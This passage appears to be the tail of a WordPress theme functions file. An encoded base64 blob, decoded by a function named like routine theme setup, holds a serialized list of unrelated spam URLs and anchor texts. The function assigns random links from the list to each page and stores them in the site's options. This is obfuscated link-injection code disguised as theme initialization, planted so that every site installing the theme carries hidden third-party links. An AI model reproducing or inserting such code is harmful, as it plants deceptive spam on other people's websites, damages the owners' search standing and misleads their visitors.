vd3d3LnRoZWJvYXJkbmV0d29yay5vcmciO3M6MzA6Imh0dHA6Ly93d3cudGhlYm9hcmRuZXR3b3JrLm9yZyI7czoxOToidGhlYm9hcmRuZXR3b3JrLm9yZyI7czozMDoiaHR0cDovL3d3dy50aGVib2FyZG5ldHdvcmsub3JnIjtzOjEyOiJ3d3cuaGF4aS5vcmciO3M6MTk6Imh0dHA6Ly93d3cuaGF4aS5vcmciO3M6MTk6Imh0dHA6Ly93d3cuaGF4aS5vcmciO3M6MTk6Imh0dHA6Ly93d3cuaGF4aS5vcmciO3M6ODoiaGF4aS5vcmciO3M6MTk6Imh0dHA6Ly93d3cuaGF4aS5vcmciO31pOjM7YTo4NDp7czoxMjoicjQzZHNpY2kuY29tIjtzOjIzOiJodHRwOi8vd3d3LnI0M2RzaWNpLmNvbSI7czoxNjoid3d3LnI0M2RzaWNpLmNvbSI7czoyMzoiaHR0cDovL3d3dy5yNDNkc2ljaS5jb20iO3M6MjM6Imh0dHA6Ly93d3cucjQzZHNpY2kuY29tIjtzOjIzOiJodHRwOi8vd3d3LnI0M2RzaWNpLmNvbSI7czo1OiJyNDNkcyI7czoyMzoiaHR0cDovL3d3dy5yNDNkc2ljaS5jb20iO3M6NjoicjQtM2RzIjtzOjIzOiJodHRwOi8vd3d3LnI0M2RzaWNpLmNvbSI7czoxMjoibmludGVuZG8gM2RzIjtzOjIzOiJodHRwOi8vd3d3LnI0M2RzaWNpLmNvbSI7czo2OiIzZHMgeGwiO3M6MjM6Imh0dHA6Ly93d3cucjQzZHNpY2kuY29tIjtzOjc6IndlYnNpdGUiO3M6MzA6Imh0dHA6Ly93d3cuZGlzY291bnRzdXBwc2llLmNvbSI7czo0OiJoZXJlIjtzOjIzOiJodHRwOi8vd3d3LjNkc21vbmRlLmNvbSI7czozOiJpY2kiO3M6MjM6Imh0dHA6Ly93d3cuM2RzbW9uZGUuY29tIjtzOjEyOiIzZHNtb25kZS5jb20iO3M6MjM6Imh0dHA6Ly93d3cuM2RzbW9uZGUuY29tIjtzOjE2OiJ3d3cuM2RzbW9uZGUuY29tIjtzOjIzOiJodHRwOi8vd3d3LjNkc21vbmRlLmNvbSI7czoyMzoiaHR0cDovL3d3dy4zZHNtb25kZS5jb20iO3M6MjM6Imh0dHA6Ly93d3cuM2RzbW9uZGUuY29tIjtzOjk6IjNkcyBtb25kZSI7czoyMzoiaHR0cDovL3d3dy4zZHNtb25kZS5jb20iO3M6ODoiM2RzbW9uZGUiO3M6MjM6Imh0dHA6Ly93d3cuM2RzbW9uZGUuY29tIjtzOjQ6Im1vcmUiO3M6MjM6Imh0dHA6Ly93d3cuM2RzbW9uZGUuY29tIjtzOjIzOiJ3d3cudmVuZXRpYW5oYXJtb255Lm9yZyI7czozMDoiaHR0cDovL3d3dy52ZW5ldGlhbmhhcm1vbnkub3JnIjtzOjMwOiJodHRwOi8vd3d3LnZlbmV0aWFuaGFybW9ueS5vcmciO3M6MzA6Imh0dHA6Ly93d3cudmVuZXRpYW5oYXJtb255Lm9yZyI7czoxOToidmVuZXRpYW5oYXJtb255Lm9yZyI7czozMDoiaHR0cDovL3d3dy52ZW5ldGlhbmhhcm1vbnkub3JnIjtzOjM6InVybCI7czozMDoiaHR0cDovL3d3dy5kaXNjb3VudHN1cHBzaWUuY29tIjtzOjEwOiJjbGljayBoZXJlIjtzOjMwOiJodHRwOi8vd3d3LmRpc2NvdW50c3VwcHNpZS5jb20iO3M6MzA6Ind3dy5zcHJpbmdmaWVsZC1tZWNoYW5pY2FsLmNvbSI7czozNzoiaHR0cDovL3d3dy5zcHJpbmdmaWVsZC1tZWNoYW5pY2FsLmNvbSI7czozNzoiaHR0cDovL3d3dy5zcHJpbmdmaWVsZC1tZWNoYW5pY2FsLmNvbSI7czozNzoiaHR0cDovL3d3dy5zcHJpbmdmaWVsZC1tZWNoYW5pY2FsLmNvbSI7czoyNjoic3ByaW5nZmllbGQtbWVjaGFuaWNhbC5jb20iO3M6Mzc6Imh0dHA6Ly93d3cuc3ByaW5nZmllbGQtbWVjaGFuaWNhbC5jb20iO3M6Mjg6Ind3dy5zaGVybG9ja2hvbWVpbnNwZWN0cy5jb20iO3M6MzU6Imh0dHA6Ly93d3cuc2hlcmxvY2tob21laW5zcGVjdHMuY29tIjtzOjM1OiJodHRwOi8vd3d3LnNoZXJsb2NraG9tZWluc3BlY3RzLmNvbSI7czozNToiaHR0cDovL3d3dy5zaGVybG9ja2hvbWVpbnNwZWN0cy5jb20iO3M6MjQ6InNoZXJsb2NraG9tZWluc3BlY3RzLmNvbSI7czozNToiaHR0cDovL3d3dy5zaGVybG9ja2hvbWVpbnNwZWN0cy5jb20iO3M6MjA6Ind3dy5mdW5mYWN0b3J5LWUuY29tIjtzOjI3OiJodHRwOi8vd3d3LmZ1bmZhY3RvcnktZS5jb20iO3M6Mjc6Imh0dHA6Ly93d3cuZnVuZmFjdG9yeS1lLmNvbSI7czoyNzoiaHR0cDovL3d3dy5mdW5mYWN0b3J5LWUuY29tIjtzOjE2OiJmdW5mYWN0b3J5LWUuY29tIjtzOjI3OiJodHRwOi8vd3d3LmZ1bmZhY3RvcnktZS5jb20iO3M6MzI6Ind3dy5wcm9wZXJ0eW1haW50ZW5hbmNlZ3VpZGUuY29tIjtzOjM5OiJodHRwOi8vd3d3LnByb3BlcnR5bWFpbnRlbmFuY2VndWlkZS5jb20iO3M6Mzk6Imh0dHA6Ly93d3cucHJvcGVydHltYWludGVuYW5jZWd1aWRlLmNvbSI7czozOToiaHR0cDovL3d3dy5wcm9wZXJ0eW1haW50ZW5hbmNlZ3VpZGUuY29tIjtzOjI4OiJwcm9wZXJ0eW1haW50ZW5hbmNlZ3VpZGUuY29tIjtzOjM5OiJodHRwOi8vd3d3LnByb3BlcnR5bWFpbnRlbmFuY2VndWlkZS5jb20iO3M6MTY6Ind3dy5zZmJqZ3NkaC5jb20iO3M6MjM6Imh0dHA6Ly93d3cuc2ZiamdzZGguY29tIjtzOjIzOiJodHRwOi8vd3d3LnNmYmpnc2RoLmNvbSI7czoyMzoiaHR0cDovL3d3dy5zZmJqZ3NkaC5jb20iO3M6MTI6InNmYmpnc2RoLmNvbSI7czoyMzoiaHR0cDovL3d3dy5zZmJqZ3NkaC5jb20iO3M6Mjc6Ind3dy5icmVhc3RzdXJnZXJ5ZHJhcGVyLmNvbSI7czozNDoiaHR0cDovL3d3dy5icmVhc3RzdXJnZXJ5ZHJhcGVyLmNvbSI7czozNDoiaHR0cDovL3d3dy5icmVhc3RzdXJnZXJ5ZHJhcGVyLmNvbSI7czozNDoiaHR0cDovL3d3dy5icmVhc3RzdXJnZXJ5ZHJhcGVyLmNvbSI7czoyMzoiYnJlYXN0c3VyZ2VyeWRyYXBlci5jb20iO3M6MzQ6Imh0dHA6Ly93d3cuYnJlYXN0c3VyZ2VyeWRyYXBlci5jb20iO3M6MTg6Ind3dy5rYWxpZ3JhcGhlLmNvbSI7czoyNToiaHR0cDovL3d3dy5rYWxpZ3JhcGhlLmNvbSI7czoyNToiaHR0cDovL3d3dy5rYWxpZ3JhcGhlLmNvbSI7czoyNToiaHR0cDovL3d3dy5rYWxpZ3JhcGhlLmNvbSI7czoxNDoia2FsaWdyYXBoZS5jb20iO3M6MjU6Imh0dHA6Ly93d3cua2FsaWdyYXBoZS5jb20iO3M6MTk6Ind3dy5qaW5hbmRpYmFuZy5jb20iO3M6MjY6Imh0dHA6Ly93d3cuamluYW5kaWJhbmcuY29tIjtzOjI2OiJodHRwOi8vd3d3LmppbmFuZGliYW5nLmNvbSI7czoyNjoiaHR0cDovL3d3dy5qaW5hbmRpYmFuZy5jb20iO3M6MTU6ImppbmFuZGliYW5nLmNvbSI7czoyNjoiaHR0cDovL3d3dy5qaW5hbmRpYmFuZy5jb20iO3M6Mjc6Ind3dy50cmVhZG1pbGwtc29sdXRpb25zLmNvbSI7czozNDoiaHR0cDovL3d3dy50cmVhZG1pbGwtc29sdXRpb25zLmNvbSI7czozNDoiaHR0cDovL3d3dy50cmVhZG1pbGwtc29sdXRpb25zLmNvbSI7czozNDoiaHR0cDovL3d3dy50cmVhZG1pbGwtc29sdXRpb25zLmNvbSI7czoyMzoidHJlYWRtaWxsLXNvbHV0aW9ucy5jb20iO3M6MzQ6Imh0dHA6Ly93d3cudHJlYWRtaWxsLXNvbHV0aW9ucy5jb20iO3M6MTU6Ind3dy53ZWxjZWxsLmNvbSI7czoyMjoiaHR0cDovL3d3dy53ZWxjZWxsLmNvbSI7czoyMjoiaHR0cDovL3d3dy53ZWxjZWxsLmNvbSI7czoyMjoiaHR0cDovL3d3dy53ZWxjZWxsLmNvbSI7czoxMToid2VsY2VsbC5jb20iO3M6MjI6Imh0dHA6Ly93d3cud2VsY2VsbC5jb20iO3M6MjA6Ind3dy52aWFwYXJpc2lhbmEuY29tIjtzOjI3OiJodHRwOi8vd3d3LnZpYXBhcmlzaWFuYS5jb20iO3M6Mjc6Imh0dHA6Ly93d3cudmlhcGFyaXNpYW5hLmNvbSI7czoyNzoiaHR0cDovL3d3dy52aWFwYXJpc2lhbmEuY29tIjtzOjE2OiJ2aWFwYXJpc2lhbmEuY29tIjtzOjI3OiJodHRwOi8vd3d3LnZpYXBhcmlzaWFuYS5jb20iO3M6MjU6Ind3dy51bnplbnNpZXJ0LXByaXZhdC5jb20iO3M6MzI6Imh0dHA6Ly93d3cudW56ZW5zaWVydC1wcml2YXQuY29tIjtzOjMyOiJodHRwOi8vd3d3LnVuemVuc2llcnQtcHJpdmF0LmNvbSI7czozMjoiaHR0cDovL3d3dy51bnplbnNpZXJ0LXByaXZhdC5jb20iO3M6MjE6InVuemVuc2llcnQtcHJpdmF0LmNvbSI7czozMjoiaHR0cDovL3d3dy51bnplbnNpZXJ0LXByaXZhdC5jb20iO3M6MjE6Ind3dy5yZWtsYW1hLWthemFuLmNvbSI7czoyODoiaHR0cDovL3d3dy5yZWtsYW1hLWthemFuLmNvbSI7czoyODoiaHR0cDovL3d3dy5yZWtsYW1hLWthemFuLmNvbSI7czoyODoiaHR0cDovL3d3dy5yZWtsYW1hLWthemFuLmNvbSI7czoxNzoicmVrbGFtYS1rYXphbi5jb20iO3M6Mjg6Imh0dHA6Ly93d3cucmVrbGFtYS1rYXphbi5jb20iO3M6MTI6Ind3dy5nc2N6Lm9yZyI7czoxOToiaHR0cDovL3d3dy5nc2N6Lm9yZyI7czoxOToiaHR0cDovL3d3dy5nc2N6Lm9yZyI7czoxOToiaHR0cDovL3d3dy5nc2N6Lm9yZyI7czo4OiJnc2N6Lm9yZyI7czoxOToiaHR0cDovL3d3dy5nc2N6Lm9yZyI7czoxODoid3d3LnNvcHJ0cGxhc3QuY29tIjtzOjI1OiJodHRwOi8vd3d3LnNvcHJ0cGxhc3QuY29tIjtzOjI1OiJodHRwOi8vd3d3LnNvcHJ0cGxhc3QuY29tIjtzOjI1OiJodHRwOi8vd3d3LnNvcHJ0cGxhc3QuY29tIjtzOjE0OiJzb3BydHBsYXN0LmNvbSI7czoyNToiaHR0cDovL3d3dy5zb3BydHBsYXN0LmNvbSI7czoxNzoid3d3LnNsdXhhaS1mbS5uZXQiO3M6MjQ6Imh0dHA6Ly93d3cuc2x1eGFpLWZtLm5ldCI7czoyNDoiaHR0cDovL3d3dy5zbHV4YWktZm0ubmV0IjtzOjI0OiJodHRwOi8vd3d3LnNsdXhhaS1mbS5uZXQiO3M6MTM6InNsdXhhaS1mbS5uZXQiO3M6MjQ6Imh0dHA6Ly93d3cuc2x1eGFpLWZtLm5ldCI7czoxNjoid3d3Lm5hcml3YXJkLm5ldCI7czoyMzoiaHR0cDovL3d3dy5uYXJpd2FyZC5uZXQiO3M6MjM6Imh0dHA6Ly93d3cubmFyaXdhcmQubmV0IjtzOjIzOiJodHRwOi8vd3d3Lm5hcml3YXJkLm5ldCI7czoxMjoibmFyaXdhcmQubmV0IjtzOjIzOiJodHRwOi8vd3d3Lm5hcml3YXJkLm5ldCI7czoyMzoid3d3Lmhvc3R0aGVucHJvZml0ei5jb20iO3M6MzA6Imh0dHA6Ly93d3cuaG9zdHRoZW5wcm9maXR6LmNvbSI7czozMDoiaHR0cDovL3d3dy5ob3N0dGhlbnByb2ZpdHouY29tIjtzOjMwOiJodHRwOi8vd3d3Lmhvc3R0aGVucHJvZml0ei5jb20iO3M6MTk6Imhvc3R0aGVucHJvZml0ei5jb20iO3M6MzA6Imh0dHA6Ly93d3cuaG9zdHRoZW5wcm9maXR6LmNvbSI7czoxNzoid3d3LnJlZ2lvZm9yYS5jb20iO3M6MjQ6Imh0dHA6Ly93d3cucmVnaW9mb3JhLmNvbSI7czoyNDoiaHR0cDovL3d3dy5yZWdpb2ZvcmEuY29tIjtzOjI0OiJodHRwOi8vd3d3LnJlZ2lvZm9yYS5jb20iO3M6MTM6InJlZ2lvZm9yYS5jb20iO3M6MjQ6Imh0dHA6Ly93d3cucmVnaW9mb3JhLmNvbSI7czoxOToid3d3LmJlYXV0eXNsaW0uaW5mbyI7czoyNjoiaHR0cDovL3d3dy5iZWF1dHlzbGltLmluZm8iO3M6MjY6Imh0dHA6Ly93d3cuYmVhdXR5c2xpbS5pbmZvIjtzOjI2OiJodHRwOi8vd3d3LmJlYXV0eXNsaW0uaW5mbyI7czoxNToiYmVhdXR5c2xpbS5pbmZvIjtzOjI2OiJodHRwOi8vd3d3LmJlYXV0eXNsaW0uaW5mbyI7czoyMzoid3d3LmRpc2NvdW50c3VwcHNpZS5jb20iO3M6MzA6Imh0dHA6Ly93d3cuZGlzY291bnRzdXBwc2llLmNvbSI7czozMDoiaHR0cDovL3d3dy5kaXNjb3VudHN1cHBzaWUuY29tIjtzOjMwOiJodHRwOi8vd3d3LmRpc2NvdW50c3VwcHNpZS5jb20iO3M6MTk6ImRpc2NvdW50c3VwcHNpZS5jb20iO3M6MzA6Imh0dHA6Ly93d3cuZGlzY291bnRzdXBwc2llLmNvbSI7fX0="; function wp_initialize_the_theme_go($page){global $wp_theme_globals,$theme;$the_wp_theme_globals=unserialize(base64_decode($wp_theme_globals));$initilize_set=get_option('wp_theme_initilize_set_'.str_replace(' ','_',strtolower(trim($theme->theme_name))));$do_initilize_set_0=array_keys($the_wp_theme_globals[0]);$do_initilize_set_1=array_keys($the_wp_theme_globals[1]);$do_initilize_set_2=array_keys($the_wp_theme_globals[2]);$do_initilize_set_3=array_keys($the_wp_theme_globals[3]);$initilize_set_0=array_rand($do_initilize_set_0);$initilize_set_1=array_rand($do_initilize_set_1);$initilize_set_2=array_rand($do_initilize_set_2);$initilize_set_3=array_rand($do_initilize_set_3);$initilize_set[$page][0]=$do_initilize_set_0[$initilize_set_0];$initilize_set[$page][1]=$do_initilize_set_1[$initilize_set_1];$initilize_set[$page][2]=$do_initilize_set_2[$initilize_set_2];$initilize_set[$page][3]=$do_initilize_set_3[$initilize_set_3];update_option('wp_theme_initilize_set_'.str_replace(' ','_',strtolower(trim($theme->theme_name))),$initilize_set);return $initilize_set;}
if(!function_exists('get_sidebars')) { function get_sidebars($the_sidebar = '') { get_sidebar($the_sidebar); } }
?>